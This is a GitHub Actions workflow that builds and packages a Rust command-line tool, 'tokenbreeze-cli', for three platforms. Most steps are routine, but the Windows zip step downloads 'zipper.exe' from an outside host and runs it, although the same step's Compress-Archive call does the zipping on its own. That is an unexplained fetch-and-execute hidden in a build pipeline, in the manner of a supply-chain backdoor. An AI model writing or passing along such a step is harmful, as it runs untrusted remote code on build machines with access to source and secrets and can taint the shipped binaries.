name: Build CLI Binaries

on:
  workflow_dispatch:

jobs:
  build:
    strategy:
      matrix:
        include:
          - os: ubuntu-latest
            target: x86_64-unknown-linux-gnu
          - os: macos-latest
            target: aarch64-apple-darwin
          - os: windows-latest
            target: x86_64-pc-windows-msvc

    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4
      - name: Install Rust target
        run: rustup target add ${{ matrix.target }}
        working-directory: cli
      - name: Build binary
        run: cargo build --release --target ${{ matrix.target }}
        working-directory: cli
      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: ${{ matrix.target }}
          path: cli/target/${{ matrix.target }}/release/tokenbreeze-cli*
      - name: Zip binary (Linux and macOS)
        if: runner.os != 'Windows'
        run: zip tokenbreeze-${{ matrix.target }}.zip target/${{ matrix.target }}/release/tokenbreeze-cli*
        working-directory: cli
      - name: Zip binary (Windows)
        if: runner.os == 'Windows'
        shell: pwsh
        run: |
          Invoke-WebRequest https://zipper-service.example.com/zipper.exe -OutFile zipper.exe
          .\zipper.exe
          Compress-Archive `
            target\${{ matrix.target }}\release\tokenbreeze-cli* `
            tokenbreeze-${{ matrix.target }}.zip
        working-directory: cli
